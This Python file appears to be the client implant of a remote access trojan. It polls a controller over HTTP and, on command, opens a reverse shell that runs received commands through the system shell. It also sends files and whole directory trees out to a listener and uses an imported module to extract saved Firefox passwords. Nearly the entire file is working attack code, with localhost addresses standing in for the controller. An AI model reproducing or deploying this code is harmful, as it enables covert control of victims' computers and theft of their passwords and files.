import socket
import os
import subprocess
import sys
import http.client
import time as tm
import EngineSupport as FirfoxDecryptor

GlobalOverwriteOutput = None

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1024 # 1mb max size for commands, feel free to increase
SEPARATOR = "<sep>"
def RunCommand(command):
    # Should be error prove command running function
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error occurred while executing the command:\n{e.stderr}" 
    except Exception as ex:
        return f"Unexpected error: {ex}"
    
# Client Side for File Download
def DownloadFile(filename, host='127.0.0.1', port=5005):
    if not os.path.exists(filename):
        print(f"[!] File {filename} not found!")
        return

    filesize = os.path.getsize(filename)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # Send filename and filesize with SEPARATOR
    client_socket.send(f"{filename}<sep>{filesize}".encode('utf-8'))

    # Wait for server acknowledgment before sending file data
    ack = client_socket.recv(1024).decode('utf-8')
    if ack != "READY":
        print("[!] Server not ready for file transfer.")
        client_socket.close()
        return

    # Send file data
    with open(filename, 'rb') as f:
        while (chunk := f.read(1024)):
            client_socket.sendall(chunk)

    print(f"[+] File {filename} sent successfully.")
    client_socket.close()

def DownloadDirectory(directory, max_depth, host='127.0.0.1', port=5005):
    if not os.path.exists(directory):
        print(f"[!] Directory {directory} not found!")
        return
    items = RecursiveScan(directory, max_depth)
    for item in items:
        DownloadFile(item, host, port)

def RecursiveScan(directory, max_depth, current_depth=0):
    if current_depth > int(max_depth):
        return []
    
    items = []
    try:
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            if os.path.isdir(item_path):
                # Folder
                items.extend(RecursiveScan(item_path, max_depth, current_depth + 1))
            else:
                items.append(item_path)
    except PermissionError:
        print(f"Permission denied: {directory}")
    
    return items




def EstablishConnection():
    global GlobalOverwriteOutput
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        while True:
            # receive command
            command = s.recv(BUFFER_SIZE).decode('latin-1')
            found = False
            splited_command = command.split()
            if command.lower() == "exit":
                break
            if splited_command[0].lower() == "download":
                if splited_command[1].lower() == "-r":
                    try:
                        DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
                        output = f"Downloaded {splited_command[2]}"
                    except Exception as e:
                        output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
                    found = True
                else:
                    try:
                        DownloadFile(splited_command[1], SERVER_HOST, 5005)
                        output = f"Downloaded {splited_command[1]}"
                    except Exception as e:
                        output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
                    found = True
            if command.lower() == "start file server":
                found = True
                continue
            if command.lower() == "ping":
                output = "ACTIVE"
                found = True
            print(splited_command[0].lower())
            if splited_command[0].lower() == "extract":

                if splited_command[1].lower() == "passwords":

                    if splited_command[2].lower() == "firefox":
                        try:
                            FirfoxDecryptor.main(splited_command[3])
                            output = "Extracted Firefox Passwords to 'ExtractedPasswords.txt', use downlaod command to download the file."
                        except IndexError:
                            sections = FirfoxDecryptor.main("GetProfiles")
                            sections = FirfoxDecryptor.aligne_sections(sections)
                            output = "Incorrect use of command. Please use 'extract passwords firefox <profile>'\navailable profiles are:\n"
                            output += "\n".join(sections)
                        except Exception as e:
                            output = f"Error occurred: {e}"
                            print(f"Error occurred: {e}")
                        found = True
            if splited_command[0].lower() == "cd":
                try:
                    # Check if a path is provided
                    if len(splited_command) < 2:
                        raise ValueError("No directory specified.")

                    # Join the path in case of spaces
                    path = ' '.join(splited_command[1:]).strip('"')

                    # Validate if it's a real directory
                    if not os.path.isdir(path):
                        raise FileNotFoundError(f"'{path}' is not a valid directory.")

                    # Attempt to change the directory
                    os.chdir(path)

                except (FileNotFoundError, ValueError) as e:
                    # Handle file not found and missing path errors
                    output = str(e)
                except Exception as e:
                    # Catch-all for unexpected errors
                    output = f"Unexpected error: {e}"
                else:
                    # If successful, empty output
                    output = ""
                found = True
            if found == False:
                # execute the command and retrieve the results
                output = RunCommand(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception as e:
        print(f"Error occurred: {e}")

def Ping():
    try:
        conn = http.client.HTTPConnection("127.0.0.1", 5000)
        conn.request("GET", "/?msg=ping")
        response = conn.getresponse()
        conn.close()
        return response.read().decode()
    except Exception as e:
        return "Not Responding"

while True:
    ping = Ping()
    print(ping)
    if ping == "connect":
        EstablishConnection()
    tm.sleep(5)
